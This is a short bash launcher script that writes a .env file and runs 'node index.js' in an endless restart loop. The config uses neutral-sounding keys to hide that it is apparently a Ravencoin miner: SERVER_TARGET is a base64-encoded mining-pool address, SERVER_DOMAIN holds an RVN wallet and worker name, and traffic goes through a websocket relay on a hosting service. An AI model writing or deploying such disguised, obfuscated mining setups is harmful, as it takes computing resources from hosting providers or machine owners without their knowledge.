#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://supporting-susan-volvo-d910cf7c.koyeb.app
SERVER_TARGET=cngudW5taW5lYWJsZS5jb206ODA=
SERVER_DOMAIN=RVN:RPAwbi57Le4u5L2Kniz1ZgGYEgHdCXx3Wu#s0y1-qqlk
SERVER_SECRET=${NAME}
SERVER_CONNECTION=${CONNECT}" > .env
while true; do node index.js; sleep 15; done
